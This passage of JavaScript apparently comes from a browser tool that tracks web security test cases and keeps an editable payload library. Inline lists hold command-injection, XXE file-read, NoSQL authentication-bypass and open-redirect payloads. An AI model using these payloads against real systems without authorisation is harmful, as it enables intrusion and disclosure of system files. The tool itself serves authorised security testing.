    document.getElementById('projectInput').value = workspace.project || '';
    document.getElementById('projectNotes').value = workspace.notes || '';
}

function updatePayloadCategoryCounts() {
    const xss = allTestCases.find(item => item.id === 'xss_payload_collection_extended');
    const sql = allTestCases.find(item => item.id === 'sqli_payload_collection_extended');
    const overrides = getPayloadOverrides();
    const count = (collection, fallback) => Array.isArray(overrides[collection]) ? overrides[collection].length : fallback;
    document.getElementById('xssPayloadButton').innerText = `XSS (${count('xss', xss ? xss.payloads.length : 0)})`;
    document.getElementById('sqlPayloadButton').innerText = `SQL (${count('sql', sql ? sql.payloads.length : 0)})`;
    document.getElementById('commandPayloadButton').innerText = `Command (${count('command', 32)})`;
    document.getElementById('xxePayloadButton').innerText = `XXE (${count('xxe', 20)})`;
    document.getElementById('nosqlPayloadButton').innerText = `NoSQL (${count('nosql', 43)})`;
    document.getElementById('openRedirectPayloadButton').innerText = `Open Redirect (${count('openRedirect', 25)})`;
}

function uniquePayloads(payloads) {
    const seen = new Set();
    return (payloads || []).map(payload => String(payload).trim()).filter(payload => {
        if (!payload || seen.has(payload)) return false;
        seen.add(payload);
        return true;
    });
}

function getPayloadOverrides() {
    try {
        return JSON.parse(localStorage.getItem(payloadStorageKey) || '{}');
    } catch (error) {
        return {};
    }
}

function getStoredPayloads(collection, builtInPayloads) {
    const overrides = getPayloadOverrides();
    return uniquePayloads(Array.isArray(overrides[collection]) ? overrides[collection] : builtInPayloads);
}

function saveStoredPayloads(collection, payloads) {
    const overrides = getPayloadOverrides();
    overrides[collection] = uniquePayloads(payloads);
    localStorage.setItem(payloadStorageKey, JSON.stringify(overrides));
    updatePayloadCategoryCounts();
}

function openPayloadCollection(collection) {
    currentPayloadCollection = collection || 'xss';
    const sources = {
        xss: {
            title: 'XSS Payloads',
            inline: allTestCases.find(item => item.id === 'xss_payload_collection_extended').payloads
        },
        sql: {
            title: 'SQL Payloads',
            inline: allTestCases.find(item => item.id === 'sqli_payload_collection_extended').payloads
        },
        command: {
            title: 'Command Injection Payloads (32)',
            inline: [
                "; echo COMMAND_TEST",
                "| echo COMMAND_TEST",
                "|| echo COMMAND_TEST",
                "&& echo COMMAND_TEST",
                "; id",
                "| id",
                "&& whoami",
                "| uname -a",
                "; printf COMMAND_TEST",
                "%3Becho%20COMMAND_TEST",
                "%26%26echo%20COMMAND_TEST",
                "%7Cecho%20COMMAND_TEST",
                ";${IFS}echo${IFS}COMMAND_TEST",
                "|${IFS}echo${IFS}COMMAND_TEST",
                "; echo$IFS$9 COMMAND_TEST",
                "; $(echo COMMAND_TEST)",
                "| `echo COMMAND_TEST`",
                "; /bin/echo COMMAND_TEST",
                "; /usr/bin/id",
                "; /usr/bin/whoami",
                "; l\\s",
                "; i\\d",
                "; whoa\\mi",
                "| l${x}s",
                "| i${x}d",
                "; l$@s",
                "; i$@d",
                "; echo vulnerable | sed 's/e/E/'",
                "; echo vulnerable | tr 'a-z' 'A-Z'",
                "; sleep 5",
                "; ping -c 1 127.0.0.1",
                "; dir"
            ],
            limit: 32
        },
        xxe: {
            title: 'XXE Payloads (20)',
            inline: [
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM "file:///etc/hosts">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % local SYSTEM "file:///etc/hosts">]><data>%local;</data>',
                '<!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://example.test/xxe.dtd">%xxe;]><data/>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><data>&xxe;</data>',
                '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="file:///etc/hosts" parse="text"/>',
                '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
                '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
                '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg>&xxe;</svg>',
                '<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><soap:Envelope>&xxe;</soap:Envelope>',
                '<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope>&xxe;</soap:Envelope>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><test attr="&xxe;">safe</test>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///sys/power/image_size">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///proc/version">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/issue">]><data>&xxe;</data>',
                '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hosts"><!ENTITY copy "&xxe;">]><data>&copy;</data>'
            ],
            limit: 20
        },
        nosql: {
            title: 'NoSQL Payloads (43)',
            inline: [
                '{"$gt":""}',
                '{"$ne":null}',
                '{"$regex":".*"}',
                '{"$in":[null,true,""]}',
                '{"$nin":[]}',
                '{"$exists":true}',
                '{"$where":"1 == 1"}',
                "' || 1==1//",
                "' && this.password.match(/.*/)//+%00",
                "' || this.password.match(/.*/)//+%00",
                "';return 'a'=='a",
                '";return(true);var xyz="a',
                '0;return true',
                "';sleep(5000);'",
                "';it=new Date();do{pt=new Date();}while(pt-it<5000);",
                "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
                "{\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
                "{\"username\":{\"$regex\":\".*\"},\"password\":{\"$regex\":\".*\"}}",
                "{\"$or\":[{}, {\"role\":\"admin\"}]}",
                "{\"$where\":\"this.email.length > 0\"}",
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
                "', $where: '1 == 1'",
                "1, $where: '1 == 1'",
                "{ $ne: 1 }",
                "', $or: [ {}, { 'a':'a' } ], $comment:'successful MongoDB injection'",
                "db.injection.insert({success:1});",
                "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                "|| 1==1",
                "' && this.passwordzz.match(/.*/)//+%00",
                "'%20%26%26%20this.password.match(/.*/)//+%00",
                "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
                "{$gt: ''}",
                "[$ne]=1",
                "';return 'a'=='a' && ''=='",
                "\";return(true);var xyz='a",
                "0;return true",
                "';sleep(5000);",
                "';sleep(5000);'",
                "';sleep(5000);+'",
                "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);",
                "{\"&exists\":false}"
            ],
            limit: 43
        },
        openRedirect: {
            title: 'Open Redirect Payloads (25)',
            inline: [
                '//example.com',
                '///example.com',
                '////example.com',
                'https://example.com',
                '/https://example.com',
                '//example.com/%2e%2e',
                '//example.com/%2f%2e%2e',
                '//example.com/%2f..',
                '//%09/example.com',
                '//%5cexample.com',
                '/%2f%2fexample.com',
                '/%5cexample.com',
                '/%09/example.com',
                '/https://%09/example.com',
                '/https://%5cexample.com',
                'https://example.com/%2e%2e',
                'https://example.com//',
                'https://example.com:80#@target.example',
                'https://example.com?@target.example',
                'javascript:alert(1)',
                '//javascript:alert(1)',
                '/javascript:alert(1)',
                'java%0d%0ascript%0d%0a:alert(1)',
                '/?url=//example.com&next=//example.com&redirect=//example.com',
                'https://trusted.example/https://example.com/'
            ],
            limit: 25
        }
    };
    const selected = sources[currentPayloadCollection] || sources.xss;
    document.getElementById('payloadDialogTitle').innerText = selected.title;
    document.getElementById('payloadList').innerHTML = '<div style="color:var(--text-sub);">Loading payloads...</div>';
    document.getElementById('payloadModal').classList.add('open');

    if (selected.inline && !selected.files) {
        renderPayloadList(getStoredPayloads(currentPayloadCollection, selected.inline).join('\n'), selected.limit, currentPayloadCollection);
        return;
    }

    Promise.all(selected.files.map(loadPayloadSource))
        .then(contents => renderPayloadList(getStoredPayloads(currentPayloadCollection, contents.concat(selected.inline || [])).join('\n'), selected.limit, currentPayloadCollection))
        .catch(() => {
            if (selected.files.length === 1) {
                requestPayloadFile(selected.files[0]);
            } else {
                document.getElementById('payloadList').innerHTML = '<div style="color:var(--text-sub);">Command payloads could not be loaded. Check the network connection.</div>';
            }
        });
}

function loadPayloadSource(source) {
    if (typeof fetch !== 'function') {
        return /^https?:\/\//i.test(source)
            ? Promise.reject(new Error('Fetch is not supported.'))
            : requestPayloadFile(source);
    }
    return fetch(source).then(response => {
        if (!response.ok) throw new Error('Payload file could not be loaded.');
        return response.text();
    }).catch(error => {
        if (/^https?:\/\//i.test(source)) throw error;
        return requestPayloadFile(source);
    });
}

function requestPayloadFile(fileName) {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = '.txt,text/plain';
    return new Promise((resolve, reject) => {
        input.onchange = event => {
            const file = event.target.files[0];
            if (!file) {
                reject(new Error('No payload file selected.'));
                return;
            }
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result);
            reader.onerror = () => reject(reader.error);
            reader.readAsText(file);
        };
    
        input.click();
    });
}

function renderPayloadList(text, limit, collection) {
    const seen = new Set();
    const payloads = text.split(/\r?\n/)
        .map(line => line.trim().replace(/<\\\/script>/g, '<' + '/script>'))
        .filter(payload => {
            if (!payload || seen.has(payload)) return false;
            seen.add(payload);
            return true;
        })
        .slice(0, limit || undefined);
    const storedPayloads = uniquePayloads(payloads);
    const container = document.getElementById('payloadList');
    container.innerHTML = '';
    storedPayloads.forEach((payload, index) => {
        const row = document.createElement('div');
        row.className = 'payload-library-row';
        const textElement = document.createElement('span');
        textElement.className = 'payload-library-text';
        textElement.textContent = payload;
        const button = document.createElement('button');
        button.className = 'btn-copy';
        button.type = 'button';
        button.innerText = 'Copy';
        button.onclick = () => copyPayloadText(payload, button);
        const actions = document.createElement('span');
        actions.className = 'payload-row-actions';
        const editButton = document.createElement('button');
        editButton.className = 'btn-sm';
        editButton.type = 'button';
        editButton.innerText = 'Edit';
        editButton.onclick = () => editPayload(index);
        const deleteButton = document.createElement('button');
        deleteButton.className = 'btn-sm';
        deleteButton.type = 'button';
        deleteButton.innerText = 'Delete';
        deleteButton.onclick = () => deletePayload(index);
        actions.append(editButton, deleteButton);
        row.append(textElement, button, actions);
        container.appendChild(row);
    });
    document.getElementById('copyAllPayloadsButton').dataset.payloads = JSON.stringify(storedPayloads);
    document.getElementById('payloadList').dataset.collection = collection || currentPayloadCollection;
}

function getCurrentPayloadList() {
    const list = document.getElementById('payloadList');
    return JSON.parse(document.getElementById('copyAllPayloadsButton').dataset.payloads || '[]');
}

function refreshCurrentPayloadList(payloads) {
    saveStoredPayloads(currentPayloadCollection, payloads);
    renderPayloadList(payloads.join('\n'), payloads.length, currentPayloadCollection);
}

function addPayload() {
    const value = prompt('Enter one payload:');
    if (value === null || !value.trim()) return;
    const payloads = getCurrentPayloadList();
    if (payloads.includes(value.trim())) {
        alert('This payload already exists.');
        return;
    }
    payloads.push(value.trim());
    refreshCurrentPayloadList(payloads);
}

function editPayload(index) {
    const payloads = getCurrentPayloadList();
    const value = prompt('Edit payload:', payloads[index]);
    if (value === null || !value.trim()) return;
    const next = value.trim();
    if (payloads.some((payload, payloadIndex) => payloadIndex !== index && payload === next)) {
        alert('This payload already exists.');
        return;
    }
    payloads[index] = next;
    refreshCurrentPayloadList(payloads);
}

function deletePayload(index) {
    const payloads = getCurrentPayloadList();
    if (!confirm('Delete this payload?')) return;
    payloads.splice(index, 1);
    refreshCurrentPayloadList(payloads);
}

function copyPayloadText(text, button) {
    const copied = () => {
        const original = button.innerText;
        button.innerText = 'Copied';
        setTimeout(() => button.innerText = original, 1000);
    };
    if (navigator.clipboard && window.isSecureContext) {
        navigator.clipboard.writeText(text).then(copied).catch(() => fallbackCopy(text, copied));
    } else {
        fallbackCopy(text, copied);
    }
}

function copyAllPayloads() {
    const button = document.getElementById('copyAllPayloadsButton');
    const payloads = JSON.parse(button.dataset.payloads || '[]');
    copyPayloadText(payloads.join('\n'), button);
}

function fallbackCopy(text, onSuccess) {
    const textarea = document.createElement('textarea');
    textarea.value = text;
    textarea.setAttribute('readonly', '');
    textarea.style.position = 'fixed';
    textarea.style.opacity = '0';
    document.body.appendChild(textarea);
    textarea.select();
    try {
        if (document.execCommand('copy')) onSuccess();
    } catch (error) {
        console.error('Copy failed:', error);
    }
    textarea.remove();
}

function closePayloadModal(event) {
    if (!event || event.target.id === 'payloadModal') {
        document.getElementById('payloadModal').classList.remove('open');
    }
}

function getCurrentFilters() {
    const pageValue = document.getElementById('pageSelect').value;
    return {
        pageName: pageValue && pageValue !== 'all-pages' ? decodeURIComponent(pageValue) : null,
        selectedLocs: getSelectedLocations(),
        search: norm(document.getElementById('searchInput').value),
        severity: summarySeverityFilter || 'all',
        status: document.getElementById('statusFilter').value,
        completion: summaryCompletionFilter
    };
}

function hasSavedNote(data, id) {
    const finding = data.findings[id] || {};
    return Boolean(
        (data.notes[id] || '').trim() ||
        (data.stepToReproduce[id] || '').trim() ||
        Object.values(finding).some(value => typeof value === 'string' && value.trim())
    );
}

function isTested(data, id) {
    return data.completed[id] === true || Boolean(data.status[id]) || hasSavedNote(data, id);
}

function updateStatusOptions() {
    const data = getSavedData();
    const select = document.getElementById('statusFilter');
    const selected = select.value;
    const counts = {
        all: testCases.length,
        Vulnerable: testCases.filter(item => getCaseStatus(data, item.id) === 'Vulnerable').length,
        Fixed: testCases.filter(item => getCaseStatus(data, item.id) === 'Fixed').length,
        notTested: testCases.filter(item => !isTested(data, item.id)).length
    };
    select.innerHTML = `
        <option value="all">All statuses (${counts.all})</option>
        <option value="Vulnerable">Vulnerable (${counts.Vulnerable})</option>
        <option value="Fixed">Fixed (${counts.Fixed})</option>
        <option value="Not tested">Not tested (${counts.notTested})</option>
    `;
    select.value = selected || 'all';
}

function matchesFilters(item, filters, data) {
    if (activeCategory && item.category !== activeCategory) return false;
    if (!matchesSelection(item, filters.pageName, filters.selectedLocs)) return false;
    if (filters.severity !== 'all' && item.severity !== filters.severity) return false;
    if (filters.status !== 'all' && filters.status !== 'Not tested' && getCaseStatus(data, item.id) !== filters.status) return false;
    if (filters.status === 'Not tested' && isTested(data, item.id)) return false;
    if (filters.completion === 'completed' && !isCompletedStatus(data, item.id)) return false;
    if (filters.completion === 'pending' && isCompletedStatus(data, item.id)) return false;
    if (filters.search) {
        const haystack = norm([item.category, item.title, item.where, item.severity, item.expected, ...item.steps, ...item.payloads].join(' '));
        if (!haystack.includes(filters.search)) return false;
    }
    return true;
}

function getVisibleCases() {
    const data = getSavedData();
    const filters = getCurrentFilters();
    return testCases
        .filter(item => matchesFilters(item, filters, data))
        .sort((a, b) => {
            const locationCount = (itemLocationMap[b.id] || []).length - (itemLocationMap[a.id] || []).length;
            return locationCount || a.title.localeCompare(b.title) || a.id.localeCompare(b.id);
        });
}

function refreshView() {
    updateStatusOptions();
    const pageValue = document.getElementById('pageSelect').value;
    const visible = pageValue && pageValue !== 'all-pages' || activeCategory || summaryCompletionFilter || summarySeverityFilter || document.getElementById('searchInput').value || document.getElementById('statusFilter').value !== 'all';
    const filtered = visible ? getVisibleCases() : [];
    renderCards(filtered);
    document.getElementById('resultsInfo').innerText = visible ? `${filtered.length} Test Case${filtered.length === 1 ? '' : 's'} Found` : '';
    renderCategories();
    updateSummary();
    updateProgressStats();
}

function splitLocations(where) {
    if (!where) return [];
    const raw = where.toString();
    const parts = raw.split(/\s*(?:,|&amp;|&|\/|\||\band\b|\+)\s*/i).map(p=>p.trim()).filter(Boolean);
    return parts;
}
const itemLocationMap = {};
testCases.forEach(item => {
    const parts = splitLocations(item.where);
    itemLocationMap[item.id] = parts.map(p => norm(p));
});

function derivePageFromWhere(where) {
    const w = (where || '').toLowerCase();
    if (w.includes('login')) return 'Login Page';
    if (w.includes('password') || w.includes('reset')) return 'Password Reset';
    if (w.includes('profile') || w.includes('user profile') || w.includes('profile settings')) return 'Profile Page';
    if (w.includes('settings') && !w.includes('profile')) return 'Settings Page';
    if (w.includes('main portal') || w.includes('main portal') || w.includes('main')) return 'Main Page';
    if (w.includes('checkout') || w.includes('cart') || w.includes('e-commerce')) return 'Checkout / Cart';
    if (w.includes('api') || w.includes('/api') || w.includes('endpoint') || w.includes('rest')) return 'API / Endpoints';
    if (w.includes('upload') || w.includes('avatar') || w.includes('file upload') || w.includes('document upload')) return 'Upload / File';
    if (w.includes('search') || w.includes('search bar')) return 'Search';
    if (w.includes('comment') || w.includes('blog') || w.includes('forum') || w.includes('support') || w.includes('ticket')) return 'Content / Comments';
    if (w.includes('oauth') || w.includes('sso') || w.includes('saml')) return 'OAuth / SSO';
    if (w.includes('graphql')) return 'GraphQL';
    if (w.includes('websocket') || w.includes('ws')) return 'WebSockets';
    if (w.includes('ssrf') || w.includes('webhook') || w.includes('preview')) return 'SSRF / Fetchers';
    if (w.includes('xss') || w.includes('cross-site scripting')) return 'XSS Targets';
    if (w.includes('idor') || w.includes('object') || w.includes('authorization')) return 'Access / IDOR';
    if (w.includes('admin')) return 'Admin / Console';
    if (w.includes('phpinfo') || w.includes('.env') || w.includes('.git')) return 'Information Disclosure';
    return 'Other';
}

function buildPageOptions() {
    const counts = {};
    const examples = {};
    testCases.forEach(item => {
        const page = derivePageFromWhere(item.where);
        counts[page] = (counts[page] || 0) + 1;
        if (!examples[page]) examples[page] = item.where;
    });
    const pages = Object.keys(counts).map(p => ({page:p, count:counts[p], example:examples[p]}))
        .sort((a,b) => b.count - a.count || a.page.localeCompare(b.page));
    const select = document.getElementById('pageSelect');
    let html = '<option value="all-pages">📁 Choose a page...</option>';
    pages.forEach(p => html += `<option value="${encodeURIComponent(p.page)}">${escapeHtml(p.page)} (${p.count})</option>`);
    select.innerHTML = html;
}

function populateSearchSuggestions() {
    const suggestionValues = new Set([
        'XSS',
        'SQLi',
        'SSRF',
        'Authentication',
        'API',
        'Upload',
        'Headers',
        'Cookies'
    ]);

    testCases.forEach(testCase => {
        [testCase.title, testCase.category, testCase.where].forEach(value => {
            if (value) suggestionValues.add(value);
        });
    });

    document.getElementById('searchSuggestions').innerHTML = [...suggestionValues]
        .sort((first, second) => first.localeCompare(second))
        .map(value => `<option value="${escapeHtml(value)}"></option>`)
        .join('');
}

function onPageChange() {
    const select = document.getElementById('pageSelect');
    const val = select.value;
    if (!val || val === 'all-pages') {
        document.getElementById('locationContainer').innerHTML = '<div style="color:var(--text-sub); font-size:0.9rem;">Select a page first to see locations.</div>';
        document.getElementById('resultsInfo').innerText = '';
        renderCategories();
        renderCards([]);
        updateSummary();
        updateProgressStats();
        return;
    }
    const pageName = decodeURIComponent(val);
    updateLocationOptions(pageName);
    const selected = getSelectedLocations();
    if (selected.length === 0) {
        showAllForPage(pageName);
    }
    refreshView();
}

function showAllForPage(pageName) {
    const filtered = getVisibleCases();
    renderCards(filtered);
    document.getElementById('resultsInfo').innerText = `${filtered.length} Test Case${filtered.length===1?'':'s'} Found`;
}

function updateLocationOptions(pageName) {
    const locCounts = {};
    const locLabelMap = {};
    testCases.forEach(item => {
        const page = derivePageFromWhere(item.where);
        if (page !== pageName) return;
        const parts = splitLocations(item.where);
        parts.forEach(p => {
            const k = norm(p);
            if (!locCounts[k]) locCounts[k] = 0;
            locCounts[k] += 1;
            if (!locLabelMap[k]) locLabelMap[k] = p;
        });
    });

    currentLocationLabelMap = {};
    const container = document.getElementById('locationContainer');
    if (Object.keys(locCounts).length === 0) {
        container.innerHTML = '<div style="color:var(--text-sub); font-size:0.9rem;">No specific locations available for this page.</div>';
        renderCards([]); document.getElementById('resultsInfo').innerText = '';
        updateProgressStats();
        return;
    }

    const frag = document.createDocumentFragment();
    Object.keys(locCounts).sort((a,b) => locCounts[b]-locCounts[a] || locLabelMap[a].localeCompare(locLabelMap[b])).forEach(k => {
        const label = locLabelMap[k];
        currentLocationLabelMap[k] = label;
        const chip = document.createElement('label');
        chip.className = 'location-chip';
        const id = `loc_${k.replace(/[^a-z0-9]/g,'_')}`;
        chip.innerHTML = `<input type="checkbox" id="${id}" data-loc="${k}" onchange="onLocationToggle()" /> <span style="font-weight:700;">${escapeHtml(label)}</span> <span class="location-count">(${locCounts[k]})</span>`;
        frag.appendChild(chip);
    });

    container.innerHTML = '';
    container.appendChild(frag);
    updateProgressStats();
}

function selectAllLocations() {
    const container = document.getElementById('locationContainer');
    if (!container) return;
    const checks = container.querySelectorAll('input[type="checkbox"][data-loc]:not(:checked)');
    checks.forEach(c => c.checked = true);
    onLocationToggle();
}
function clearLocations() {
    const container = document.getElementById('locationContainer');
    if (!container) return;
    const checks = container.querySelectorAll('input[type="checkbox"][data-loc]:checked');
    checks.forEach(c => c.checked = false);
    const val = document.getElementById('pageSelect').value;
    if (!val || val === 'all-pages') {
        renderCards([]); document.getElementById('resultsInfo').innerText = '';
        renderCategories(); updateSummary(); updateProgressStats();
        return;
    }
    const pageName = decodeURIComponent(val);
    showAllForPage(pageName);
    refreshView();
}

function getSelectedLocations() {
    const container = document.getElementById('locationContainer');
    if (!container) return [];
    const checks = container.querySelectorAll('input[type="checkbox"][data-loc]:checked');
    return Array.from(checks).map(ch => ch.getAttribute('data-loc'));
}

function matchesSelection(item, pageName, selectedLocs) {
    if (pageName && derivePageFromWhere(item.where) !== pageName) return false;
    if (!selectedLocs || selectedLocs.length === 0) return true;
    const itemLocs = itemLocationMap[item.id] || [];
    return selectedLocs.some(sel => itemLocs.includes(sel) || norm(item.where) === sel);
}

function onLocationToggle() {
    refreshView();
}

function renderCategories() {
    const container = document.getElementById('categoryContainer');
    const categories = [...new Set(testCases.map(item => item.category))];
    const data = getSavedData();
    const pageVal = document.getElementById('pageSelect') ? document.getElementById('pageSelect').value : 'all-pages';
    const pageName = pageVal && pageVal !== 'all-pages' ? decodeURIComponent(pageVal) : null;
    const selectedLocs = getSelectedLocations();

    container.innerHTML = '';

    categories.forEach(cat => {
        const catItems = testCases.filter(i => {
            const matchesCat = i.category === cat;
            const matchesPage = !pageName || derivePageFromWhere(i.where) === pageName;
            const matchesLocs = !selectedLocs.length || (itemLocationMap[i.id] || []).some(l => selectedLocs.includes(l)) || selectedLocs.includes(norm(i.where));
            const selectedStatus = document.getElementById('statusFilter').value;
            const matchesStatus = selectedStatus === 'all' || selectedStatus === 'Not tested' || getCaseStatus(data, i.id) === selectedStatus;
            const matchesSummarySeverity = !summarySeverityFilter || i.severity === summarySeverityFilter;
            const search = norm(document.getElementById('searchInput').value);
            const haystack = norm([i.category, i.title, i.where, i.severity, i.expected, ...i.steps, ...i.payloads].join(' '));
            const matchesNotTested = document.getElementById('statusFilter').value !== 'Not tested' || !isTested(data, i.id);
            return matchesCat && matchesPage && matchesLocs && matchesSummarySeverity && matchesStatus && matchesNotTested && (!search || haystack.includes(search));
        });

        const total = catItems.length;
        const completed = catItems.filter(i => isCompletedStatus(data, i.id)).length;

        const pill = document.createElement('div');
        pill.className = `cat-pill ${activeCategory === cat ? 'active' : ''}`;
        pill.onclick = () => {
            activeCategory = activeCategory === cat ? null : cat;
            document.getElementById('activeCategoryTitle').innerText = activeCategory ? `${cat} Vulnerabilities` : 'All Vulnerabilities';
            refreshView();
        };

        pill.innerHTML = `${cat} <span class="cat-count">${completed}/${total}</span>`;
        container.appendChild(pill);
    });
}

function renderCards(cardsToRender) {
    const container = document.getElementById('cardContainer');
    container.innerHTML = '';
    const data = getSavedData();
    const selectedLocs = getSelectedLocations();

    if (!cardsToRender || cardsToRender.length === 0) {
        container.innerHTML = '<div style="text-align:center; padding:30px; color:var(--text-sub);">No matching test cases found for this selection.</div>';
        updateProgressStats();
        return;
    }

    cardsToRender.forEach((item, idx) => {
        const caseStatus = getCaseStatus(data, item.id);
        const isChecked = data.completed[item.id] === true;
        const card = document.createElement('div'); card.className = 'test-card';

        let matchedDisplay = '';
        if (selectedLocs.length === 0) {
            const locs = itemLocationMap[item.id] || [];
            matchedDisplay = `Matches: ${locs.length}`;
        } else {
            const itemLocs = itemLocationMap[item.id] || [];
            const matched = selectedLocs.filter(s => itemLocs.includes(s) || norm(item.where) === s);
            if (matched.length > 0) {
                const labels = matched.map(m => currentLocationLabelMap[m] || m);
                matchedDisplay = `Matched: ${labels.join(', ')}`;
            } else {
                matchedDisplay = `Matched: 0`;
            }
        }

        let stepsHtml = '<div class="steps-heading">PoC / Steps to Check</div><ol class="step-list">';
        getReportSteps(item).forEach(s => stepsHtml += `<li class="step-item">${escapeHtml(s)}</li>`);
        stepsHtml += '</ol>';

        const validationGuidance = getValidationGuidance(item);
        let payloadsHtml = '';
        item.payloads.forEach(p => {
            payloadsHtml += `
                <div class="payload-row">
                    <span class="payload-text">${escapeHtml(decodeHtml(p))}</span>
                    <button class="btn-copy" data-payload="${escapeHtml(p)}" onclick="copyText(this)">Copy</button>
                </div>
            `;
        });

        card.innerHTML = `
            <div class="card-top">
                <div class="test-title-area">
                    <input type="checkbox" id="check-${item.id}" ${isChecked ? 'checked' : ''} onchange="toggleStatus('${item.id}')" style="width:20px; height:20px; cursor:pointer; margin-top:2px; accent-color: var(--primary);">
                    <label for="check-${item.id}" class="test-title" style="cursor:pointer;">${idx+1}. ${escapeHtml(item.title)}</label>
                </div>
                <div class="badge-group">
                    <span class="badge where">${escapeHtml(item.where)}</span>
                    <span class="match-badge">${escapeHtml(matchedDisplay)}</span>
                    <span class="badge ${item.severity.toLowerCase()}">${item.severity}</span>
                    <select class="status-filter" onchange="saveStatus('${item.id}', this.value)">
                        <option value="" disabled ${caseStatus ? '' : 'selected'}>Choose status</option>
                        ${['Vulnerable', 'Fixed'].map(status => `<option value="${status}" ${caseStatus === status ? 'selected' : ''}>${status}</option>`).join('')}
                    </select>
                </div>
            </div>
            <div class="steps-box">${stepsHtml}</div>
            <div>${payloadsHtml}</div>
            <div class="expected-box"><strong>Expected Result:</strong> ${escapeHtml(item.expected)}</div>
        `;
        container.appendChild(card);
    });

    updateProgressStats();
}

function toggleStatus(id) {
    const data = getSavedData();
    const checkbox = document.getElementById(`check-${id}`);
    data.completed[id] = !!(checkbox && checkbox.checked);
    saveData(data);
    refreshView();
}

function saveStatus(id, value) {
    const data = getSavedData();
    data.status[id] = value;
    saveData(data);
    refreshView();
}

function saveFinding(id, field, value) {
    const data = getSavedData();
    data.findings[id] = data.findings[id] || {};
    data.findings[id][field] = value;
    saveData(data);
}

function getSafeScreenshots(finding) {
    return (finding && Array.isArray(finding.screenshots) ? finding.screenshots : [])
        .filter(image => typeof image === 'string' && /^data:image\/(png|jpeg|gif|webp);base64,/i.test(image));
}

function renderFindingPanel(id, finding) {
    const screenshots = getSafeScreenshots(finding);
    const screenshotHtml = screenshots.map((image, index) => `
        <span class="screenshot-item">
            <img class="screenshot-preview" src="${escapeHtml(image)}" alt="Finding screenshot ${index + 1}" onclick="openScreenshot('${id}', ${index})">
            <button type="button" class="screenshot-remove" onclick="removeScreenshot('${id}', ${index})">Remove</button>
        </span>
    `).join('');
    return `
        <div class="finding-panel">
            <div class="steps-heading">Finding Evidence</div>
            <div class="finding-grid">
                <div>
                    <label for="finding-url-${id}">Affected URL</label>
                </div>
                <div>
                    <label for="finding-parameter-${id}">Parameter / endpoint</label>
                    <input id="finding-parameter-${id}" class="finding-field" value="${escapeHtml(finding.parameter || '')}" placeholder="id, q, /api/resource/123" oninput="saveFinding('${id}', 'parameter', this.value)">
                </div>
                <div>
                    <label for="finding-reference-${id}">Reference</label>
                    <input id="finding-reference-${id}" class="finding-field" value="${escapeHtml(finding.reference || '')}" placeholder="Request ID, screenshot, or note" oninput="saveFinding('${id}', 'reference', this.value)">
                </div>
                <div>
                    <label for="finding-evidence-${id}">Impact / evidence</label>
                    <textarea id="finding-evidence-${id}" class="finding-field" placeholder="Observed response, impact, and redacted evidence..." oninput="saveFinding('${id}', 'evidence', this.value)">${escapeHtml(finding.evidence || '')}</textarea>
                </div>
            </div>
            <label for="finding-steps-${id}">Your steps to check</label>
            <textarea id="finding-steps-${id}" class="notepad-field" placeholder="Example: Open the authorized test page, enter a harmless marker, submit once, and record the response..." oninput="saveStepToReproduce('${id}', this.value)">${escapeHtml(getSavedData().stepToReproduce[id] || '')}</textarea>
            <label for="finding-remediation-${id}">Remediation / retest</label>
            <textarea id="finding-remediation-${id}" class="finding-field" placeholder="Suggested fix and retest result..." oninput="saveFinding('${id}', 'remediation', this.value)">${escapeHtml(finding.remediation || '')}</textarea>
            <label for="finding-screenshots-${id}">Screenshots</label>
            <input id="finding-screenshots-${id}" class="screenshot-field" type="file" accept="image/png,image/jpeg,image/gif,image/webp" multiple onchange="saveScreenshots('${id}', this.files)">
            <div class="screenshot-list">${screenshotHtml}</div>
        </div>
    `;
}

function saveScreenshots(id, files) {
    const imageFiles = Array.from(files || []).filter(file => /^(image\/(png|jpeg|gif|webp))$/i.test(file.type));
    if (!imageFiles.length) return;
    Promise.all(imageFiles.map(file => new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.readAsDataURL(file);
    }))).then(images => {
        const data = getSavedData();
        data.findings[id] = data.findings[id] || {};
